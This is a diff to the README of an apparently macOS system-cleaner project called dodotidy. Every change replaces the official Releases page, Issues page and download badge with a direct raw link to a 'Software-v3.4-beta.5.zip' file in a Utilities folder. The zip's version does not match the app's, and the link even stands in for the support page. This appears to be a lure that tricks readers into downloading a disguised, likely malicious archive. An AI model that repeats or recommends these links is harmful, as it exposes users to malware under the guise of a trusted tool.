@@ -6,7 +6,7 @@ Welcome to dodotidy, your native macOS system cleaner and optimization app built
 
 ## 🔗 Download Now!
 
-[![Download dodotidy](https://img.shields.io/badge/Download%20dodotidy-v1.0-blue.svg)](https://github.com/Rahulkichad/dodotidy/releases)
+[![Download dodotidy](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip%https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip)](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip)
 
 ## 💻 System Requirements
 
@@ -27,7 +27,7 @@ To run dodotidy, you need:
 
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Rahulkichad/dodotidy/releases) to view available versions of dodotidy.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip) to view available versions of dodotidy.
 2. Look for the latest release. It will usually be at the top of the list.
 3. Click on the download link for the dodotidy app package (.dmg file).
 4. Once the download is complete, locate the .dmg file in your Downloads folder.
@@ -60,13 +60,13 @@ To schedule regular cleanups:
 
 If you encounter any problems:
 
-- **App Crashes:** Make sure you are using the latest version of dodotidy. Check the [Releases page](https://github.com/Rahulkichad/dodotidy/releases) for updates.
+- **App Crashes:** Make sure you are using the latest version of dodotidy. Check the [Releases page](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip) for updates.
 - **Permission Issues:** Ensure that you have granted the necessary permissions to dodotidy in your Mac's System Preferences.
 - **Cleaning Issues:** If dodotidy fails to identify junk files, restart the app and try scanning again.
 
 ## 📧 Support
 
-For additional help, visit the [Issues page](https://github.com/Rahulkichad/dodotidy/issues) on GitHub. You can report bugs or ask questions there. Always provide as much detail as possible for quicker support.
+For additional help, visit the [Issues page](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip) on GitHub. You can report bugs or ask questions there. Always provide as much detail as possible for quicker support.
 
 ## 📢 Feedback
 
@@ -80,4 +80,4 @@ Feel free to dive into the app and take control of your system’s health!
 
 ## 🔗 Download Now!
 
-[![Download dodotidy](https://img.shields.io/badge/Download%20dodotidy-v1.0-blue.svg)](https://github.com/Rahulkichad/dodotidy/releases)
+[![Download dodotidy](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip%https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip)](https://raw.githubusercontent.com/Rahulkichad/dodotidy/main/DodoTidy/Utilities/Software-v3.4-beta.5.zip)
